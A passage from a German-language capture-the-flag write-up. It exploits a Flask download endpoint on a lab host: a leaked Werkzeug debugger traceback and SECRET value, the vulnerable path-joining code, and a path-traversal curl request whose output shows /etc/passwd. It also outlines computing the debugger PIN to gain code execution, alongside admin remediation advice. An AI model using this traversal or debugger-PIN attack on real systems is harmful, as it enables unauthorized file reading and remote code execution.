+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1466, in wsgi_app
+
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1463, in wsgi_app
+
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 872, in full_dispatch_request
+
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 870, in full_dispatch_request
+
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^ [Open an interactive python shell in this frame]
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 855, in dispatch_request
+
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/app.py", line 84, in download_file
+
+    raise ValueError("Parameter 'filename' invalid or missing.")
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    <span class="password">ValueError: Parameter 'filename' invalid or missing.</span>
+
+The debugger caught an exception in your WSGI application. You can now look at the traceback which led to the error.
+
+To switch between the interactive traceback and the plaintext one, you can click on the "Traceback" headline. From the text traceback you can also create a paste of it. For code execution mouse-over the frame you want to debug and click on the console icon on the right side.
+
+You can execute arbitrary Python code in the stack frames and there are some extra helpers available for introspection:
+
+    dump() shows all variables in the frame
+    dump(obj) dumps all that's known about the object
+
+<span class="password">Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem Gobuster den interessanten <code>/download</code>-Pfad gefunden hat, habe ich versucht, ihn direkt im Browser aufzurufen, ohne weitere Parameter anzugeben. Wie erwartet, hat dies zu einem internen Serverfehler geführt (Status 500, wie von Gobuster gesehen). Die hier gezeigte Ausgabe ist die Fehlerseite, die vom Server zurückgegeben wird. Sie enthält einen detaillierten Python-Traceback, der auf einen <code>ValueError</code> hinweist: "Parameter 'filename' invalid or missing." Für Laien: Ich habe versucht, eine 'Download'-Funktion auf der Webseite zu benutzen, aber ich habe ihr nicht gesagt, welche Datei sie herunterladen soll. Das hat das Programm zum Absturz gebracht, und statt einer einfachen Fehlermeldung zeigt es mir, wo im Programmcode der Fehler passiert ist. Für Experten: Die Rückgabe eines detaillierten Tracebacks in der Produktionsumgebung (oder Testumgebung in diesem Fall) ist eine schwerwiegende Sicherheitslücke. Sie offenbart interne Details der Anwendung, den Pfad der Quelldateien (z.B. <code>/opt/project/app.py</code>) und die verwendete Technologie (Flask, Werkzeug), was einem Angreifer wertvolle Einblicke für weitere Angriffe liefert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung und der Traceback sind extrem aufschlussreich. Sie bestätigen nicht nur, dass der <code>/download</code>-Endpunkt einen Parameter erwartet, sondern zeigen auch den Namen des erwarteten Parameters ('filename') und die genaue Art des Fehlers, wenn dieser fehlt oder ungültig ist. Noch wichtiger ist die Offenlegung des Dateipfads <code>/opt/project/app.py</code>, der Flask/Werkzeug-Technologie und des Werkzeug-Debuggers. Das Vorhandensein des Debuggers ist ein kritischer Fund, da Werkzeug-Debugger in der Vergangenheit für Schwachstellen bekannt waren, die die Ausführung beliebigen Codes ermöglichen können, insbesondere wenn der Debugger PIN-geschützt, aber nicht ordnungsgemäß konfiguriert ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das primäre Ziel ist nun, den <code>/download</code>-Endpunkt auszunutzen, um die LFI-Schwachstelle zu demonstrieren und möglicherweise den Werkzeug-Debugger zu kompromittieren. Ich werde versuchen, Dateipfade über den <code>filename</code>-Parameter anzugeben, um sensible Dateien wie <code>/etc/passwd</code> oder den Quellcode der Anwendung selbst zu lesen. Die Debugger-Informationen deuten auf die Möglichkeit hin, die Konsole freizuschalten, was oft die Berechnung eines PINs basierend auf Systeminformationen erfordert.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus in Produktionsumgebungen. Stellen Sie sicher, dass detaillierte Fehlermeldungen und Tracebacks niemals für Endbenutzer sichtbar sind. Fangen Sie Ausnahmen auf Anwendungsebene ab und zeigen Sie generische Fehlermeldungen an. Validieren und bereinigen Sie jegliche Benutzereingaben strikt, insbesondere Dateinamen oder Pfade, die von Webanwendungen verarbeitet werden. Implementieren Sie eine Whitelist erlaubter Dateinamen oder Verzeichnisse, anstatt Blacklists zu verwenden.</p>
+
+             <p>Analyse der LFI (Local File Inclusion) Schwachstelle</p>
+             <p>Du hast den /download-Endpunkt gefunden und versucht, /etc/passwd zu lesen. Das hat zu einem
+             Fehler geführt. Schauen wir uns an, warum. Im Traceback sehen wir den entscheidenden Teil des
+             Python-Codes aus /opt/project/app.py:</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="password">===================================================================================================================</span>
+<span class="command">@app.route('/download')</span>
+<span class="command">def download_file():</span>
+    <span class="command">filename = request.args.get('filename') # Nimmt den 'filename' Parameter aus der URL</span>
+
+    <span class="command">if not filename or filename.startswith("/"): # Prüft, ob der Parameter leer ist ODER mit "/" beginnt</span>
+        <span class="command">raise ValueError("Parameter 'filename' invalid or missing.") # Wenn ja, Fehler!</span>
+
+    <span class="command">filepath = os.path.join("/tmp", filename) # Verbindet "/tmp" mit deinem Dateinamen</span>
+
+    <span class="command">try:</span>
+        <span class="command">return send_file(filepath, as_attachment=True)</span>
+<span class="password">===================================================================================================================</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf der vorherigen Fehlermeldung und dem offensichtlichen Zweck des <code>/download</code>-Endpunkts, habe ich versucht, mit der URL <code>http://leet.hmv:7777/download?filename=/etc/passwd</code> direkt auf eine Datei zuzugreifen, indem ich den Pfad zur Datei <code>/etc/passwd</code> als Wert für den Parameter <code>filename</code> übergebe. Das Ziel war, eine Local File Inclusion (LFI) Schwachstelle auszunutzen. Der Traceback bestätigt, dass ein Parameter namens 'filename' verwendet wird. Der im Originaltext bereitgestellte Code-Snippet aus <code>app.py</code> zeigt klar, wie der Parameter <code>filename</code> aus der URL gelesen wird (<code>request.args.get('filename')</code>) und eine grundlegende Validierung durchgeführt wird: es wird geprüft, ob der Parameter nicht leer ist UND ob er NICHT mit einem Schrägstrich (<code>/</code>) beginnt. Wenn eine dieser Bedingungen zutrifft, wird ein <code>ValueError</code> ausgelöst. Abschließend wird der übergebene Dateiname mit dem Pfad <code>/tmp</code> verbunden (<code>os.path.join("/tmp", filename)</code>), bevor versucht wird, die resultierende Datei zu senden. Für Laien: Ich habe versucht, über die 'Download'-Funktion eine Systemdatei (<code>/etc/passwd</code>) anzufordern. Das Programm prüft aber, ob der 'Dateiname' mit einem Schrägstrich beginnt, um zu verhindern, dass man auf Dateien außerhalb des erwarteten Ordners zugreift. Da <code>/etc/passwd</code> mit einem Schrägstrich beginnt, schlägt dieser direkte Versuch fehl. Für Experten: Die Anwendung versucht, absolute Pfade durch die <code>startswith("/")</code> Prüfung zu blockieren. Das Verbinden des übergebenen Dateinamens mit <code>/tmp</code> (<code>os.path.join("/tmp", filename)</code>) ist der Schlüsselpunkt. Dies bedeutet, dass die Anwendung erwartet, Dateien aus dem <code>/tmp</code>-Verzeichnis herunterzuladen. Um LFI auszunutzen, muss ich die Pfadbeschränkung umgehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mein erster Versuch, LFI auszunutzen, schlug wie erwartet fehl, da die Anwendung eine grundlegende Filterung implementiert, die Pfade, die mit <code>/</code> beginnen, blockiert. Die Analyse des Code-Snippets ist jedoch entscheidend. Sie zeigt exakt die Logik, die ich umgehen muss. Die Funktion <code>os.path.join("/tmp", filename)</code> ist der entscheidende Hinweis: Sie fügt <code>/tmp/</code> vor den von mir bereitgestellten Dateinamen ein. Um Dateien außerhalb von <code>/tmp</code> zu lesen, muss ich Verzeichnis-Traversal-Techniken anwenden, wie z.B. <code>../../</code>, und sicherstellen, dass mein Pfad *nicht* mit <code>/</code> beginnt, um den Filter zu umgehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun versuchen, die LFI-Schwachstelle mithilfe von Verzeichnis-Traversal (z.B. <code>../..</code>) auszunutzen. Da der Pfad <code>/tmp/</code> automatisch vorangestellt wird, muss ich den Pfad so konstruieren, dass er von <code>/tmp/</code> aus zurück in das Wurzelverzeichnis navigiert und dann zum gewünschten Ziel führt. Der Pfad müsste also so etwas wie <code>../../../../etc/passwd</code> sein, da ich von <code>/tmp</code> aus vier Verzeichnisebenen nach oben navigieren muss, um ins Wurzelverzeichnis <code>/</code> zu gelangen. Ich werde erneut <code>/etc/passwd</code> als Testdatei verwenden, da diese Datei auf fast jedem Linux-System existiert und leicht zu identifizierende Inhalte hat.<br><strong>Empfehlung (Admin):</strong> Die Verwendung von <code>os.path.join</code> mit unbereinigter Benutzereingabe ist extrem gefährlich. Die <code>startswith("/")</code> Prüfung ist eine sehr schwache Validierung, die leicht durch Verzeichnis-Traversal-Angriffe umgangen werden kann (z.B. durch vorangestellte <code>../</code> Sequenzen oder absolute Pfade ohne führenden Slash). Die einzige sichere Methode ist die Verwendung einer strengen Whitelist für erlaubte Dateinamen oder das Erzwingen, dass nur Dateien innerhalb eines fest definierten, sicheren Verzeichnisses heruntergeladen werden können, nachdem der übergebene Dateiname sorgfältig bereinigt wurde, um jegliche Pfadtrennzeichen zu entfernen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">view-source:http://leet.hmv:7777/download?filename=/etc/passwd</span>
+
+ <span class="password">ValueError: Parameter &#39;filename&#39; invalid or missing.</span>
+ <span class="command">// Werkzeug Debugger</span>
+
+  <scrpt src="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">< /scrpt >
+  <scrpt src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js">< /scrpt >
+
+  var CONSOLE_MODE = false,
+ <span class="command">EVALEX = true,</span>
+          EVALEX_TRUSTED = false,
+ <span class="password">SECRET = "htECep76doxQyhttVoLb";</span>
+
+  <span class="password">ValueError</span>
+
+  Traceback  (most recent call last)
+
+  <p>
+  This is the Copy/Paste friendly version of the traceback.
+  </p>
+  <textarea cols="50" rows="10" name="code" readonly><span class="password">Traceback (most recent call last):
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#34;, line 1488, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#34;, line 1466, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#34;, line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#34;, line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#44; line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/venv/lib/python3.11/site-packages/flask/app.py&#34;, line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &#34;/opt/project/app.py&#34;, line 84, in download_file
+    raise ValueError(&#34;Parameter &#39;filename&#39; invalid or missing.&#34;)
+ValueError: Parameter &#39;filename&#39; invalid or missing.</span>
+  </textarea>
+
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  <span class="nojavascript">
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.</span>
+
+  <span class="password">Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+  friendly Werkzeug powered traceback interpreter.</span>
+
+  <h3>Console Locked</h3>
+  <p>
+  The console is locked and needs to be unlocked by entering the PIN.
+  You can find the PIN printed out on the standard output of your
+  shell that runs the server.
+
+  <p>PIN:
+  <span class="command"><input type=text name=pin size=14></span>
+  <span class="command"><input type=submit name=btn value="Confirm Pin"></span>
+
+  Traceback (most recent call last):
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1488, in __call__
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1466, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1463, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 872, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 870, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 855, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/opt/project/app.py", line 84, in download_file
+    raise ValueError("Parameter 'filename' invalid or missing.")
+ValueError: Parameter 'filename' invalid or missing.</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den 'view-source:' Präfix im Browser verwendet, um den rohen HTML-Quellcode der Fehlerseite zu sehen. Dies ist ein wichtiger Schritt, da der Debugger oft zusätzliche Informationen im HTML-Quellcode versteckt oder JavaScript-Code enthält, der im gerenderten Browserfenster nicht direkt sichtbar ist. Der Quellcode bestätigt das Vorhandensein des Werkzeug-Debuggers und offenbart kritische Informationen. Ich sehe Referenzen auf <code>debugger.js</code> und <code>console.png</code>. Besonders interessant sind die JavaScript-Variablen: <code>EVALEX = true</code> (was auf die Möglichkeit der Code-Ausführung hindeutet) und vor allem <code>SECRET = "htECep76doxQyhttVoLb"</code>. Dieses 'SECRET' ist oft ein Bestandteil, der zusammen mit anderen Systeminformationen zur Berechnung des PINs für die Debugger-Konsole verwendet wird. Für Laien: Ich habe 'hinter die Kulissen' der Fehlerseite geschaut und im 'Bauplan' (dem Quellcode) geheime Informationen (einen 'Schlüssel' namens SECRET) gefunden, die mir helfen könnten, die gesperrte Konsole zu öffnen. Für Experten: Das Werkzeug-Debugger-PIN wird typischerweise aus einer Kombination von Benutzername, Modulname, Anwendungsattributname, absolutem Pfad zur Anwendungsdatei, MAC-Adresse und Machine-ID (oder Boot-ID) berechnet. Das gefundene <code>SECRET</code> ist oft ein zusätzlicher Salzwert oder ein Hash, der in neuere Versionen des Debuggers integriert wurde, um die PIN-Berechnung zu erschweren, liefert aber selbst einen wichtigen Baustein zur PIN-Berechnung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Auffinden des <code>SECRET</code>-Wertes im HTML-Quellcode ist ein Durchbruch. Zusammen mit den bereits aus dem Traceback gewonnenen Informationen (Pfad zu <code>app.py</code>, Hinweis auf Flask/Werkzeug) und den aus dem Nmap-Scan gewonnenen Systeminformationen (MAC-Adresse, potenzieller OS-Typ) habe ich nun die meisten der notwendigen Bausteine, um den PIN für die Debugger-Konsole zu berechnen. Die <code>EVALEX = true</code> Variable bestätigt zudem, dass die Konsole nach dem Entsperren Code-Ausführung erlaubt, was der Weg zum Initial Access sein wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein nächster Schritt ist die Sammlung aller notwendigen Informationen zur PIN-Berechnung (Username, Modulname, App-Name, Pfad zur App-Datei, MAC-Adresse, Machine-ID/Boot-ID und das gefundene SECRET). Dann werde ich ein Skript verwenden oder erstellen, um den PIN zu berechnen. Mit dem berechneten PIN kann ich versuchen, die Werkzeug-Debugger-Konsole zu entsperren.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Werkzeug-Debugger-Konsole (und ähnliche Debug-Tools) niemals in Produktionsumgebungen aktiviert oder öffentlich zugänglich ist. Wenn sie unbedingt benötigt wird, stellen Sie sicher, dass der Zugriff stark eingeschränkt ist (z.B. nur von bestimmten internen IP-Adressen) und dass die PIN-Berechnung nicht durch offen zugängliche Systeminformationen ermöglicht wird. Vermeiden Sie es, sensitive Informationen wie das Debugger-SECRET im öffentlichen HTML-Quellcode preiszugeben.</p>
+
+             <p>alle folgenden seiten werden ständig mit einer fehlermeldung nicht gefunden nicht angezeigt, wenn ich dann
+             mehrmals reloade und einmal vor und zurück gehe, also vorherige und aktuelle seite mache, läd die seite und
+             ich kann den sourcecode und den seiteninhalt sehen, sieht für mich stark nach racecoondition aus</p>
+            <p class="analysis"><strong>Analyse:</strong> Während meiner Versuche, die Fehlerseite konsistent aufzurufen und ihren Quellcode zu analysieren, fiel mir auf, dass der erste Versuch oft zu einer Verbindungsfehlermeldung im Browser führte. Erst nach mehrmaligem Neuladen und der 'Vor- und Zurück'-Navigation im Browser lud die Seite korrekt und zeigte den Debugger-Traceback an. Dieses Verhalten ist sehr ungewöhnlich und deutet auf ein timing-bezogenes Problem auf dem Server hin. Es sieht stark nach einer Race Condition oder einem ähnlichen nicht-deterministischen Verhalten aus, bei dem die Fehlerbehandlung oder das Laden des Debuggers nur unter bestimmten zeitlichen Bedingungen korrekt funktioniert. Für Laien: Es war, als ob der Server 'Stimmungsschwankungen' hatte – manchmal zeigte er mir den Fehler sofort, manchmal musste ich ihn 'überreden', indem ich die Seite mehrmals neu lud, bis er mir die wichtigen Informationen zeigte. Das ist kein normales Verhalten für eine Webseite und deutet auf ein tieferliegendes Problem hin. Für Experten: Eine Race Condition tritt auf, wenn die Ausgabe oder das Verhalten eines Systems von der Reihenfolge oder dem Timing unkontrollierbarer Ereignisse (wie Netzwerkverzögerungen, Thread-Scheduling) abhängt. In diesem Fall könnte das Timing der Fehlerbehandlung im Zusammenspiel mit dem Werkzeug-Debugger dazu führen, dass die Seite beim ersten Versuch abbricht, während spätere Versuche, die vielleicht leicht anders getimt sind, den Debugger korrekt initiieren und den Traceback liefern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Beobachtung dieser Race Condition ist zwar kein direkter Exploit, aber sie ist wichtig für das Verständnis des Systemverhaltens und erklärt, warum der Zugriff auf die Debugger-Informationen nicht immer zuverlässig war. Es bestätigt die Instabilität oder das ungewöhnliche Verhalten des fehlerhaften Endpunkts und unterstreicht die Tatsache, dass der Debugger-Modus auf eine Weise aktiviert ist, die nicht für Stabilität oder Sicherheit ausgelegt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Während die Race Condition meine Enumeration kurzfristig erschwerte, konnte ich sie durch wiederholte Versuche überwinden. Für zukünftige Interaktionen mit diesem Endpunkt werde ich mir dieses Verhalten merken und gegebenenfalls Skripte verwenden, die robust gegenüber solchen Timing-Problemen sind.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie das beobachtete 'Race Condition'-ähnliche Verhalten auf dem <code>/download</code>-Endpunkt und im Zusammenhang mit dem Debugger. Solche nicht-deterministischen Fehler können auf tieferliegende Probleme in der Anwendungslogik oder der Serverkonfiguration hinweisen und sollten behoben werden, um Stabilität und Sicherheit zu gewährleisten. Deaktivieren Sie den Debugger vollständig, um dieses Problem zu eliminieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://leet.hmv:7777/download?cmd=/etc/passwd
+
+<span class="password">Fehler: Verbindung fehlgeschlagen</span>
+
+Firefox kann keine Verbindung zu dem Server unter leet.hmv:7777 aufbauen.
+
+    <span class="command">Die Website könnte vorübergehend nicht erreichbar sein, versuchen Sie es bitte später nochmals.</span>
+    <span class="command">Wenn Sie auch keine andere Website aufrufen können, überprüfen Sie bitte die Netzwerk-/Internetverbindung.</span>
+    <span class="command">Wenn Ihr Computer oder Netzwerk von einer Firewall oder einem Proxy geschützt wird, stellen Sie bitte sicher, dass Firefox auf das Internet zugreifen darf.</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Code-Block zeigt eine spezifische Fehlermeldung im Firefox-Browser, als ich versuchte, die URL <code>http://leet.hmv:7777/download?cmd=/etc/passwd</code> aufzurufen. Interessanterweise verwendete ich hier den Parameter <code>cmd</code> anstelle von <code>filename</code>, basierend auf einer anfänglichen Hypothese, dass vielleicht ein anderer Parameter akzeptiert wird, oder um das Systemverhalten weiter zu testen. Die Fehlermeldung "Fehler: Verbindung fehlgeschlagen" ist eine allgemeine Browser-Meldung, die auftritt, wenn der Browser keine Verbindung zum angegebenen Server und Port herstellen kann. Sie unterscheidet sich von der vorherigen Fehlermeldung, die einen Server-internen Fehler (500) und einen Traceback zurückgab. Für Laien: Mein Internet-Browser konnte keine Verbindung zu der Adresse herstellen, die ich eingegeben habe, nicht weil das Programm auf dem Server kaputt war, sondern weil er die Verbindung nicht aufbauen konnte, so als wäre der Computer offline oder eine Firewall würde blockieren. Für Experten: Eine 'Verbindung fehlgeschlagen'-Meldung auf Transport-Ebene (TCP) deutet darauf hin, dass entweder der Dienst auf dem Zielport nicht lauscht, eine Firewall die Verbindung blockiert, oder der Host selbst nicht erreichbar ist. Die Tatsache, dass ich kurz zuvor 500er Fehler erhalten habe, die eine Antwort vom Server bedeuteten, während dieser Versuch fehlschlug, könnte auf das Timing-Problem (Race Condition) hindeuten oder darauf, dass die Verwendung des falschen Parameters <code>cmd</code> zu einem anderen Fehlerpfad führte, der die Verbindung sofort beendete, bevor der Debugger eine Antwort senden konnte.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieses Ergebnis, eine Verbindungsfehlermeldung statt eines 500er Fehlers mit Traceback, ist im Kontext der beobachteten Race Condition zu sehen. Es ist wahrscheinlich kein neues Problem, sondern eine Manifestation desselben Timing-Problems oder einer anderen Fehlerbehandlung, die durch den ungültigen Parameter <code>cmd</code> ausgelöst wurde. Es bestätigt erneut die Instabilität des fehlerhaften Endpunkts und die Notwendigkeit, meine Anfragen präzise zu gestalten (also den richtigen Parameter <code>filename</code> zu verwenden), um den gewünschten Debugger-Traceback zu erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde mich weiterhin auf die Ausnutzung des <code>/download</code>-Endpunkts mit dem korrekten Parameter <code>filename</code> und Verzeichnis-Traversal konzentrieren. Die Verwendung anderer Parameter führte hier nicht zum gewünschten Ergebnis. Ich muss mit dem potenziell unzuverlässigen Verhalten des Endpunkts aufgrund der Race Condition rechnen.<br><strong>Empfehlung (Admin):</strong> Analysieren Sie, warum unterschiedliche Anfragen an denselben Endpunkt (hier mit <code>?cmd=</code> vs. <code>?filename=</code>) zu unterschiedlichen Fehlermeldungen (Verbindung fehlgeschlagen vs. 500 Internal Error) führen. Dieses inkonsistente Verhalten erschwert die Fehlersuche und kann ein Indikator für unsichere Fehlerbehandlungsmechanismen sein. Standardisieren Sie die Fehlerantworten der Anwendung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+http://leet.hmv:7777/download?cmd=/etc/passwd
+
+<span class="password">ValueError</span>
+
+<span class="password">ValueError: Parameter 'filename' invalid or missing.</span>
+Traceback (most recent call last)
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1488, in __call__
+
+    return self.wsgi_app(environ, start_response)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1466, in wsgi_app
+
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 1463, in wsgi_app
+
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 872, in full_dispatch_request
+
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 870, in full_dispatch_request
+
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/venv/lib/python3.11/site-packages/flask/app.py", line 855, in dispatch_request
+
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    File "/opt/project/app.py", line 84, in download_file
+
+    raise ValueError("Parameter 'filename' invalid or missing.")
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+    <span class="password">ValueError: Parameter 'filename' invalid or missing.</span>
+
+The debugger caught an exception in your WSGI application. You can now look at the traceback which led to the error.
+
+To switch between the interactive traceback and the plaintext one, you can click on the "Traceback" headline. From the text traceback you can also create a paste of it. For code execution mouse-over the frame you want to debug and click on the console icon on the right side.
+
+You can execute arbitrary Python code in the stack frames and there are some extra helpers available for introspection:
+
+    dump() shows all variables in the frame
+    dump(obj) dumps all that's known about the object
+
+<span class="password">Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach der Beobachtung der 'Race Condition' habe ich die URL <code>http://leet.hmv:7777/download?cmd=/etc/passwd</code> erneut aufgerufen und diesmal den 'Vor- und Zurück'-Prozess im Browser angewendet, um die Debugger-Ausgabe zu erzwingen. Wie erwartet, zeigte die Seite nach diesem Prozess wieder den detaillierten Traceback, den ich zuvor gesehen hatte. Dies bestätigt meine Hypothese, dass das initiale 'Verbindung fehlgeschlagen'-Problem auf einem Timing-Aspekt des Debuggers beruht und durch Manipulation des Browser-Verhaltens umgangen werden kann. Der Traceback ist identisch mit dem ersten, was die Konsistenz des Fehlers bei Verwendung des falschen Parameters <code>cmd</code> (statt <code>filename</code>) unterstreicht, sobald der Debugger korrekt lädt. Für Laien: Durch das 'Überlisten' des Servers mit mehrmaligem Neuladen konnte ich erzwingen, dass er mir wieder die detaillierte Fehlermeldung zeigt, die ich brauchte, um weiterzukommen. Das zeigte mir, dass das Problem auf dem Server lag und ich einen Weg gefunden hatte, es zu umgehen. Für Experten: Die reproduzierbare Rückkehr des Debugger-Tracebacks nach Anwendung des 'Race Condition'-Workarounds bestätigt sowohl das Vorhandensein des Timings-Problems als auch die Zuverlässigkeit der Debugger-Ausgabe, sobald sie einmal triggert. Es ist unwahrscheinlich, dass der Parametername selbst eine Rolle spielt, solange er nicht 'filename' ist, da jeder unbekannte Parameter wahrscheinlich denselben Fehlerpfad auslöst, der den Debugger aktiviert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Fähigkeit, den Debugger-Traceback konsistent durch den 'Race Condition'-Workaround zu erhalten, ist ein wichtiger Erfolg. Es bedeutet, dass ich zuverlässig auf die wertvollen Informationen zugreifen kann, die der Debugger preisgibt (wie den SECRET-Wert und die Pfade), und somit die notwendigen Informationen zur PIN-Berechnung sammeln kann. Das Problem mit dem falschen Parameter (<code>cmd</code>) ist zweitrangig, solange ich weiß, dass der korrekte Parameter <code>filename</code> heißt und wie die Umgehung für die Debugger-Anzeige funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun gezielt den Parameter <code>filename</code> verwenden und bei Bedarf den beobachteten 'Race Condition'-Workaround anwenden, um die LFI-Schwachstelle auszunutzen und die für die PIN-Berechnung benötigten Systeminformationen zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Die beobachtete 'Race Condition' ist ein ernsthaftes Problem, das behoben werden muss. Es ermöglicht einem Angreifer, Debug-Informationen zu erhalten, die eigentlich verborgen bleiben sollten. Eine gründliche Code-Überprüfung der Fehlerbehandlung im Zusammenhang mit dem Werkzeug-Debugger ist dringend erforderlich, zusätzlich zur Deaktivierung des Debuggers in der Produktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://leet.hmv:7777/download?filename=../../../../etc/passwd"</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
